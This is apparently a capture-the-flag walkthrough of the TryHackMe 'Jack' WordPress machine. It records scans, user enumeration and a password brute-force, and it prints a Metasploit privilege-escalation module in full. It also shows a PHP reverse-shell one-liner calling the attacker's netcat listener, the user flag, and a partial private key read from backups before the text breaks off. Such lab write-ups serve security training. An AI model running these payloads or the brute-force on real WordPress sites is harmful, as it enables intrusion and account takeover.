---
Compromise a web server running Wordpress, obtain a low privileged user and escalate your privileges to root using a Python module.
---

![](https://i.imgur.com/SRmSCVZ.png)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/2437ebb70c56f4c55cfe6c2851ed1551.png)

### Deploy & Root

 Start Machine 

Connect to our network and deploy this machine.

Add jack.thm to /etc/hosts

Answer the questions below

```rb
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.73.143 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.73.143:22
Open 10.10.73.143:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 12:15 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:15
Completed Parallel DNS resolution of 1 host. at 12:15, 0.03s elapsed
DNS resolution of 1 IPs took 0.09s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:15
Scanning 10.10.73.143 [2 ports]
Discovered open port 80/tcp on 10.10.73.143
Discovered open port 22/tcp on 10.10.73.143
Completed Connect Scan at 12:15, 0.21s elapsed (2 total ports)
Initiating Service scan at 12:15
Scanning 2 services on 10.10.73.143
Completed Service scan at 12:15, 6.57s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.73.143.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 8.99s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 1.27s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
Nmap scan report for 10.10.73.143
Host is up, received user-set (0.21s latency).
Scanned at 2023-01-18 12:15:16 EST for 17s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e7978089331d0837fe2bcb614bf5d9b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgHGMuutSoQktLWJfDa8F4+zCvINuPv8+mL2sHPJmSfFDaQ3jlsxitYWH7FWdj3zPzXLW01aY+AySXW593T3XZpzCSAjm3ImnPtNTaQsbsdkgmhj8eZ3q9hPxU5UD5593K+/FDdIiN5xIBLegm6y0SAd3sRtpdrcpHpkqOIZvoCyJTV7ncbRY0gppvfTEObo2PiCtzh31gbaDPrJICPnDuuF5aWAUTeUMc0YcMYaB9cCvfVT6Y1Cdfh4IwMHslafXRhRt5tn5l47xR0xwd3cddUEez/CHxiNthNTgv+BSo+TPPciPAiCN3QGSqTcPQ74RvFiAznL2irkENq+Qws2A3
|   256 3a679faf7e66fae3f8c754496338a293 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzJknVQsubSrZMKNLlNAP1HXXuXzhtAf24ScY17eIS03NfxjFwiSESz8xKwVcmbODQGc+b9PvepngTTGlVrMf4=
|   256 8cef55b023732c14094522ac84cb40d2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/WxvJRsI0dvT84mxR/y3AH3C8KP/1Njv4wP6DylZeQ
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Jack&#039;s Personal Site &#8211; Blog for Jacks writing adven...
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-generator: WordPress 5.3.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.92 seconds

┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts      
[sudo] password for kali: 
                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ tail /etc/hosts
10.10.20.190 windcorp.thm
10.10.148.212 fire.windcorp.thm
10.10.85.102 selfservice.windcorp.thm
10.10.85.102 selfservice.dev.windcorp.thm
10.10.167.117 team.thm
10.10.167.117 dev.team.thm
10.10.29.100 set.windcorp.thm
10.10.20.190 Osiris.windcorp.thm Osiris osiris.windcorp.thm
10.10.37.31  UNATCO
10.10.73.143 jack.thm

┌──(kali㉿kali)-[~]
└─$ wpscan --url http://jack.thm -e ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://jack.thm/ [10.10.73.143]
[+] Started: Wed Jan 18 12:19:20 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://jack.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://jack.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: online-portfolio
 | Location: http://jack.thm/wp-content/themes/online-portfolio/
 | Last Updated: 2021-07-30T00:00:00.000Z
 | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
 | [!] The version is out of date, the latest version is 0.1.0
 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
 | Style Name: Online Portfolio
 | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
 | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
 | Author: Ample Themes
 | Author URI: https://amplethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jan 18 12:19:48 2023
[+] Requests Done: 40
[+] Cached Requests: 7
[+] Data Sent: 8.662 KB
[+] Data Received: 12.343 MB
[+] Memory used: 234.227 MB
[+] Elapsed time: 00:00:28

┌──(kali㉿kali)-[~]
└─$ wpscan --url http://jack.thm -e u 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://jack.thm/ [10.10.73.143]
[+] Started: Wed Jan 18 12:20:23 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://jack.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://jack.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: online-portfolio
 | Location: http://jack.thm/wp-content/themes/online-portfolio/
 | Last Updated: 2021-07-30T00:00:00.000Z
 | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
 | [!] The version is out of date, the latest version is 0.1.0
 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
 | Style Name: Online Portfolio
 | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
 | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
 | Author: Ample Themes
 | Author URI: https://amplethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <============================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jan 18 12:20:38 2023
[+] Requests Done: 30
[+] Cached Requests: 38
[+] Data Sent: 7.527 KB
[+] Data Received: 230.207 KB
[+] Memory used: 197.637 MB
[+] Elapsed time: 00:00:14

jack, wendy, danny

┌──(kali㉿kali)-[~]
└─$ cat users_jack 
jack
wendy
danny

https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt

┌──(kali㉿kali)-[~]
└─$ wpscan --url http://jack.thm -U users_jack -P /usr/share/wordlists/fasttrack.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://jack.thm/ [10.10.73.143]
[+] Started: Wed Jan 18 12:35:19 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://jack.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://jack.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: online-portfolio
 | Location: http://jack.thm/wp-content/themes/online-portfolio/
 | Last Updated: 2021-07-30T00:00:00.000Z
 | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
 | [!] The version is out of date, the latest version is 0.1.0
 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
 | Style Name: Online Portfolio
 | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
 | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
 | Author: Ample Themes
 | Author URI: https://amplethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:10 <===========================================================> (137 / 137) 100.00% Time: 00:00:10

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - wendy / changelater                                                                                                           
Trying danny / starwars Time: 00:01:17 <==============================================                 > (646 / 868) 74.42%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: wendy, Password: changelater

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jan 18 12:37:11 2023
[+] Requests Done: 818
[+] Cached Requests: 7
[+] Data Sent: 371.288 KB
[+] Data Received: 610.033 KB
[+] Memory used: 252.492 MB
[+] Elapsed time: 00:01:52

wendy: changelater

jack.thm/wp-admin

----
using terminator (shortcuts)

ctrl + shift+ d (open vertically / derecha)
ctrl + shift + a (open horizontally / abajo)
ctrl + shift + w (close terminal)
ctrl + shift + tab (move previous terminal)
ctrl + tab (move next terminal)
windows + arrow up (expand terminal)
ctrl + shift + left arrow, right arrow, down arrow, up arrow (adjust terminal)
ctrl + shift + t (open a new tab)
ctrl + shift + i (open a new terminal)


---

┌──(kali㉿kali)-[~]
└─$ searchsploit wordpress role privilege
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
WordPress Plugin User Role Editor < 4.25 - Privileg | php/webapps/44595.rb
---------------------------------------------------- ---------------------------------
Shellcodes: No Results


┌──(kali㉿kali)-[~]
└─$ searchsploit -m php/webapps/44595.rb 
  Exploit: WordPress Plugin User Role Editor < 4.25 - Privilege Escalation
      URL: https://www.exploit-db.com/exploits/44595
     Path: /usr/share/exploitdb/exploits/php/webapps/44595.rb
    Codes: N/A
 Verified: False
File Type: Ruby script, ASCII text, with very long lines (987)
Copied to: /home/kali/44595.rb


                                                                                      
┌──(kali㉿kali)-[~]
└─$ cat 44595.rb     
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress User Role Editor Plugin Privilege Escalation',
      'Description'     => %q{
        The WordPress User Role Editor plugin prior to v4.25, is lacking an authorization
        check within its update user profile functionality ("update" function, contained
        within the "class-user-other-roles.php" module).
        Instead of verifying whether the current user has the right to edit other users'
        profiles ("edit_users" WP capability), the vulnerable function verifies whether the
        current user has the rights to edit the user ("edit_user" WP function) specified by
        the supplied user id ("user_id" variable/HTTP POST parameter). Since the supplied
        user id is the current user's id, this check is always bypassed (i.e. the current
        user is always allowed to modify its profile).
        This vulnerability allows an authenticated user to add arbitrary User Role Editor
        roles to its profile, by specifying them via the "ure_other_roles" parameter within
        the HTTP POST request to the "profile.php" module (issued when "Update Profile" is
        clicked).
        By default, this module grants the specified WP user all administrative privileges,
        existing within the context of the User Role Editor plugin.
      },
      'Author'          =>
        [
          'ethicalhack3r',    # Vulnerability discovery
          'Tomislav Paskalev' # Exploit development, metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['WPVDB', '8432'],
          ['URL', 'https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/']
	],
      'DisclosureDate'  => 'Apr 05 2016',
    ))

    register_options(
      [
        OptString.new('TARGETURI',   [true, 'URI path to WordPress', '/']),
        OptString.new('ADMINPATH',   [true, 'wp-admin directory', 'wp-admin/']),
        OptString.new('CONTENTPATH', [true, 'wp-content directory', 'wp-content/']),
        OptString.new('PLUGINSPATH', [true, 'wp plugins directory', 'plugins/']),
        OptString.new('PLUGINPATH',  [true, 'User Role Editor directory', 'user-role-editor/']),
        OptString.new('USERNAME',    [true, 'WordPress username']),
        OptString.new('PASSWORD',    [true, 'WordPress password']),
	OptString.new('PRIVILEGES',  [true, 'Desired User Role Editor privileges', 'activate_plugins,delete_others_pages,delete_others_posts,delete_pages,delete_posts,delete_private_pages,delete_private_posts,delete_published_pages,delete_published_posts,edit_dashboard,edit_others_pages,edit_others_posts,edit_pages,edit_posts,edit_private_pages,edit_private_posts,edit_published_pages,edit_published_posts,edit_theme_options,export,import,list_users,manage_categories,manage_links,manage_options,moderate_comments,promote_users,publish_pages,publish_posts,read_private_pages,read_private_posts,read,remove_users,switch_themes,upload_files,customize,delete_site,create_users,delete_plugins,delete_themes,delete_users,edit_plugins,edit_themes,edit_users,install_plugins,install_themes,unfiltered_html,unfiltered_upload,update_core,update_plugins,update_themes,ure_create_capabilities,ure_create_roles,ure_delete_capabilities,ure_delete_roles,ure_edit_roles,ure_manage_options,ure_reset_roles'])
      ])
  end

  # Detect the vulnerable plugin by enumerating its readme.txt file
  def check
    readmes = ['readme.txt', 'Readme.txt', 'README.txt']

    res = nil
    readmes.each do |readme_name|
      readme_url = normalize_uri(target_uri.path, datastore['CONTENTPATH'], datastore['PLUGINSPATH'], datastore['PLUGINPATH'], readme_name)
      vprint_status("Checking #{readme_url}")
      res = send_request_cgi(
        'uri'    => readme_url,
        'method' => 'GET'
      )
      break if res && res.code == 200
    end

    if res.nil? || res.code != 200
      # The readme.txt file does not exist
      return Msf::Exploit::CheckCode::Unknown
    end

    version_res = extract_and_check_version(res.body.to_s, :readme, 'plugin', '4.25', nil)
    return version_res
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  # Search for specified data within the provided HTTP response
  def check_response(res, name, regex)
    res.body =~ regex
    result = $1
    if result
      print_good("#{peer} - WordPress - Getting data   - #{name}")
    else
      vprint_error("#{peer} #{res.body}")
      fail_with("#{peer} - WordPress - Getting data   - Failed (#{name})")
    end
    return result
  end

  # Run the exploit
  def run
    # Check if the specified target is running WordPress
    fail_with("#{peer} - WordPress - Not Found") unless wordpress_and_online?

    # Authenticate to WordPress
    print_status("#{peer} - WordPress - Authentication - #{username}:#{password}")
    cookie = wordpress_login(username, password)
    fail_with("#{peer} - WordPress - Authentication - Failed") if cookie.nil?
    store_valid_credential(user: username, private: password, proof: cookie)
    print_good("#{peer} - WordPress - Authentication - OK")

    # Get additional information from WordPress, required for the HTTP POST request (anti-CSRF tokens, user parameters)
    url = normalize_uri(wordpress_url_backend, 'profile.php')
    print_status("#{peer} - WordPress - Getting data   - #{url}")
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => url,
      'cookie'   => cookie
    })

    if res and res.code == 200
      wp_nonce     = check_response(res, "_wpnonce",     /name=\"_wpnonce\" value=\"(.+?(?=\"))\"/)
      color_nonce  = check_response(res, "color-nonce",  /name=\"color-nonce\" value=\"(.+?(?=\"))\"/)
      checkuser_id = check_response(res, "checkuser_id", /name=\"checkuser_id\" value=\"(.+?(?=\"))\"/)
      nickname     = check_response(res, "nickname",     /name=\"nickname\" id=\"nickname\" value=\"(.+?(?=\"))\"/)
      display_name = check_response(res, "display_name", /name=\"display_name\" id=\"display_name\"\>[\s]+\<option  selected=\'selected\'\>(.+?(?=\<))\</)
      email        = check_response(res, "email",        /name=\"email\" id=\"email\" value=\"(.+?(?=\"))\"/)
      user_id      = check_response(res, "user_id",      /name=\"user_id\" id=\"user_id\" value=\"(.+?(?=\"))\"/)
    else
      fail_with("#{peer} - WordPress - Getting data   - Server response (code #{res.code})")
    end

    # Send HTTP POST request - update the specified user's privileges
    print_status("#{peer} - WordPress - Changing privs - #{username}")
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => url,
      'vars_post' => {
        '_wpnonce'         => wp_nonce,
        '_wp_http_referer' => URI::encode(url),
        'from'             => 'profile',
        'checkuser_id'     => checkuser_id,
        'color-nonce'      => color_nonce,
        'admin_color'      => 'fresh',
        'admin_bar_front'  => '1',
        'first_name'       => '',
        'last_name'        => '',
        'nickname'         => nickname,
        'display_name'     => display_name,
        'email'            => email,
        'url'              => '',
        'description'      => '',
        'pass1'            => '',
        'pass2'            => '',
        'ure_other_roles'  => datastore['PRIVILEGES'],
        'action'           => 'update',
        'user_id'          => user_id,
        'submit'           => 'Update+Profile'
      },
      'cookie'    => cookie
    })

    # check outcome
    if res and res.code == 302
      print_good("#{peer} - WordPress - Changing privs - OK")
    else
      fail_with("#{peer} - WordPress - Changing privs - Server response (code #{res.code})")
    end
  end
end

# EoF   

go to profile and press update profile then use burp
&ure_other_roles=administrator

pass2=&ure_other_roles=administrator&action=update

go to editor plugin
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f")?>
then
activate akismet plugin 

┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                     
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.73.143.
Ncat: Connection from 10.10.73.143:38888.
bash: cannot set terminal process group (1184): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jack:/var/www/html/wp-admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
</wp-admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'                   
www-data@jack:/var/www/html/wp-admin$ 
zsh: suspended  rlwrap nc -lvnp 1337
                                                                                                      
┌──(kali㉿kali)-[~/Downloads]
└─$ stty raw -echo; fg        
[1]  + continued  rlwrap nc -lvnp 1337
www-data@jack:/var/www/html/wp-admin$ export TERM=xterm256-color
export TERM=xterm256-color
www-data@jack:/var/www/html/wp-admin$ cd /home
cd /home
www-data@jack:/home$ ls
ls
jack
www-data@jack:/home$ cd jack
cd jack
www-data@jack:/home/jack$ ls -lah
ls -lah
total 36K
drwxr-xr-x 4 jack jack 4.0K Jan 10  2020 .
drwxr-xr-x 3 root root 4.0K Jan  8  2020 ..
lrwxrwxrwx 1 jack jack    9 Jan 10  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jack jack  220 Jan  8  2020 .bash_logout
-rw-r--r-- 1 jack jack 3.7K Jan  8  2020 .bashrc
drwx------ 2 jack jack 4.0K Jan  9  2020 .cache
-rw-r--r-- 1 jack jack  655 Jan  8  2020 .profile
drwx------ 2 jack jack 4.0K Jan 10  2020 .ssh
-rw-r--r-- 1 root root  140 Jan 10  2020 reminder.txt
-rw-rw-r-- 1 jack jack   33 Jan 10  2020 user.txt
www-data@jack:/home/jack$ cat user.txt
cat user.txt
0052f7829e48752f2e7bf50f1231548a

www-data@jack:/home/jack$ cat reminder.txt
cat reminder.txt

Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.

www-data@jack:/home/jack$ cd .ssh
cd .ssh
bash: cd: .ssh: Permission denied

www-data@jack:/home/jack$ locate backups
locate backups
/var/backups
/var/backups/alternatives.tar.0
/var/backups/apt.extended_states.0
/var/backups/apt.extended_states.1.gz
/var/backups/dpkg.arch.0
/var/backups/dpkg.arch.1.gz
/var/backups/dpkg.diversions.0
/var/backups/dpkg.diversions.1.gz
/var/backups/dpkg.statoverride.0
/var/backups/dpkg.statoverride.1.gz
/var/backups/dpkg.status.0
/var/backups/dpkg.status.1.gz
/var/backups/group.bak
/var/backups/gshadow.bak
/var/backups/passwd.bak
/var/backups/shadow.bak
www-data@jack:/home/jack$ cd /var/backups
cd /var/backups
www-data@jack:/var/backups$ ls
ls
alternatives.tar.0	  dpkg.diversions.1.gz	  gshadow.bak
apt.extended_states.0	  dpkg.statoverride.0	  id_rsa
apt.extended_states.1.gz  dpkg.statoverride.1.gz  passwd.bak
dpkg.arch.0		  dpkg.status.0		  shadow.bak
dpkg.arch.1.gz		  dpkg.status.1.gz
dpkg.diversions.0	  group.bak
www-data@jack:/var/backups$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxfBR9F9V5G2snv1Xaaxv3VHbFZ2VZRwGyU+ah6komBeaAldr
